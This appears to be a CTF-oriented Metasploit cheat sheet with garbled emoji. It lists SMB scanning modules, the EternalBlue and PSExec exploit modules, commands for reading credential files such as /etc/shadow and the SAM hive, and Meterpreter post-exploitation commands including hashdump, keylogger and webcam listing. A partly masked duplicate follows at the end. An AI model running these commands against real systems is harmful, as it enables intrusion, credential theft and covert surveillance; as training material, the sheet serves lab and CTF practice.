ğŸ“– 1. Introduction to Metasploit
Metasploit is a penetration testing framework that allows security professionals to:

ğŸ§ª Test system vulnerabilities

ğŸ”¨ Develop and execute exploit code

ğŸ” Perform post-exploitation enumeration

ğŸ¯ Simulate real-world attacks

ğŸ› ï¸ 2. Basic Metasploit Commands
ğŸ–¥ï¸ Console Operations
bash
# Start Metasploit Console
msfconsole

# Search for modules
search smb
search type:auxiliary name:scanner

# Use a module
use auxiliary/scanner/smb/smb_version

# Show options
show options

# Set options
set RHOSTS 10.0.0.1
set THREADS 10

# Run module
run
ğŸ” 3. Common SMB Modules
ğŸ“Š Scanning & Enumeration
bash
# SMB Version Detection
use auxiliary/scanner/smb/smb_version

# SMB Share Enumeration
use auxiliary/scanner/smb/smb_enumshares

# SMB User Enumeration
use auxiliary/scanner/smb/smb_enumusers

# SMB Login Check
use auxiliary/scanner/smb/smb_login
ğŸ’¥ Exploitation Modules
bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue

# PSExec (with credentials)
use exploit/windows/smb/psexec


# In meterpreter session
meterpreter > shell

# In Windows shell
C:\> powershell -c "Get-ADObject -Filter '*' -Properties * | Select-Object Description,Info,Comment,Notes | Select-String 'flag{'"

# Or check user comments
C:\> net user username /domain
C:\> wmic useraccount get name,sid,description



ğŸ´â€â˜ ï¸ 6. CTF Flag Hunting Guide - Where to Find Flags
ğŸ—‚ï¸ Active Directory Locations
powershell
# ğŸ” User descriptions/comments
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -match "flag{"}

# ğŸ‘¥ Group descriptions
Get-ADGroup -Filter * -Properties Description | Where-Object {$_.Description -match "flag{"}

# ğŸ’» Computer objects
Get-ADComputer -Filter * -Properties Description | Where-Object {$_.Description -match "flag{"}

# ğŸ¯ Service Principal Names (SPNs)
setspn -L <username>
ğŸ“ File System Locations
bash
# ğŸ“„ Common flag file names
meterpreter > search -f *flag*.txt
meterpreter > search -f flag.txt
meterpreter > search -f *.txt | findstr flag
meterpreter > search -f *secret*
meterpreter > search -f *password*

# ğŸ“ Common directories (Windows)
C:\Users\Public\
C:\Windows\Temp\
C:\ProgramData\
C:\inetpub\wwwroot\
C:\xampp\htdocs\
%APPDATA%
%TEMP%

# ğŸ“ Common directories (Linux)
/root/
/home/*/Desktop/
/var/www/html/
/tmp/
/opt/
/etc/
ğŸ” Registry Locations (Windows)
powershell
# Registry paths that often contain flags
Get-ItemProperty -Path "HKLM:\Software\CTF" -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKCU:\Software\CTF" -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-String "flag{"
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Select-Object DisplayName,Description | Select-String "flag{"
ğŸŒ Web Application Locations
bash
# Source code inspection
meterpreter > cat /var/www/html/index.php
meterpreter > cat /var/www/html/config.php

# Database dumps
meterpreter > cat /var/www/html/backup.sql
meterpreter > cat /var/www/html/dump.sql

# Environment files
meterpreter > cat .env
meterpreter > cat config.ini
ğŸ“ Document & Configuration Files
bash
# ğŸ” Text files
find / -name "*.txt" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null

# ğŸ“‹ Configuration files
find / -name "*.conf" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
find / -name "*.config" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null

# ğŸ“„ Readme and documentation
find / -name "README*" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
find / -name "*.md" -type f 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
ğŸ—„ï¸ Database Locations
sql
-- MySQL/MariaDB
SELECT * FROM information_schema.tables WHERE table_comment LIKE '%flag%';
SELECT * FROM information_schema.columns WHERE column_comment LIKE '%flag%';

-- PostgreSQL
SELECT * FROM pg_tables WHERE tablename LIKE '%flag%';
SELECT * FROM information_schema.columns WHERE column_name LIKE '%flag%';
ğŸ¨ Steganography & Hidden Data
bash
# ğŸ” Strings in binary files
strings file.exe | grep -i flag

# ğŸ“¸ Images (EXIF data)
exiftool image.jpg | grep -i flag

# ğŸ“ Hidden directories
ls -la | grep "^\."
find / -type d -name ".*" 2>/dev/null

# ğŸ“ Hidden files
find / -type f -name ".*" 2>/dev/null | xargs grep -l "flag{" 2>/dev/null
ğŸ”‘ Password & Credential Files
bash
# ğŸ” Common credential file locations
meterpreter > cat /etc/passwd
meterpreter > cat /etc/shadow
meterpreter > cat C:\Windows\System32\config\SAM
meterpreter > cat C:\Windows\System32\config\SYSTEM

# ğŸ“„ Configuration files with passwords
find / -name "*.xml" -type f 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.yml" -type f 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.json" -type f 2>/dev/null | xargs grep -l "password" 2>/dev/null
ğŸ“‹ 7. Meterpreter Cheat Sheet
ğŸ¯ Basic Commands
bash
sysinfo           # â„¹ï¸ System information
getuid           # ğŸ‘¤ Current user
ps               # ğŸ“Š List processes
migrate <PID>    # ğŸ”„ Migrate to another process
ğŸ“ File Operations
bash
pwd              # ğŸ“ Print working directory
ls               # ğŸ“‚ List files
cd               # ğŸ“ Change directory
download file    # â¬‡ï¸ Download file
upload file      # â¬†ï¸ Upload file
ğŸ” Information Gathering
bash
hashdump         # ğŸ”‘ Dump password hashes
screenshot       # ğŸ“¸ Take screenshot
keyscan_start    # âŒ¨ï¸ Start keylogger
webcam_list      # ğŸ“¹ List webcams



------------------------


# Start Metasploit Console
msfconsole

# Search for modules
search *****
search type:auxiliary name:scanner

# Use a module
use ********/*****/*****_version

# Show options
show options

# Set options
set RHOSTS ********
set THREADS 10

# Run module
run

# ***** Version Detection
use auxiliary/scanner/*****/*****_version

# ***** Share Enumeration
use auxiliary/scanner/*****/*****_enumshares

# ***** User Enumeration
use auxiliary/scanner/*****/*****_enumusers

# ***** Login Check
use auxiliary/scanner/*****/*****_login

# ***** (MS**-***) - FOR LEGITIMATE PATCH TESTING ONLY
use exploit/*****/*****/*****

# ***** (with credentials) - FOR AUTHORIZED USE ONLY
use exploit/*****/*****/*****


# ***** (MS**-***) - FOR LEGITIMATE PATCH TESTING ONLY
use exploit/*****/*****/*****

# ***** (with credentials) - FOR AUTHORIZED USE ONLY
use exploit/*****/*****/*****


sysinfo           # â„¹ï¸ System information
getuid           # ğŸ‘¤ Current user
ps               # ğŸ“Š List processes
migrate ********    # ğŸ”„ Migrate to another process

pwd              # ğŸ“ Print working directory
ls               # ğŸ“‚ List files
cd               # ğŸ“ Change directory
download *****    # â¬‡ï¸ Download file
upload *****      # â¬†ï¸ Upload file

********         # ğŸ”‘ Dump password hashes (AUTHORIZED SYSTEMS ONLY)
********       # ğŸ“¸ Take screenshot
********    # âŒ¨ï¸ Start keylogger (LEGAL CTFS ONLY)
********      # ğŸ“¹ List webcams (AUTHORIZED USE ONLY)


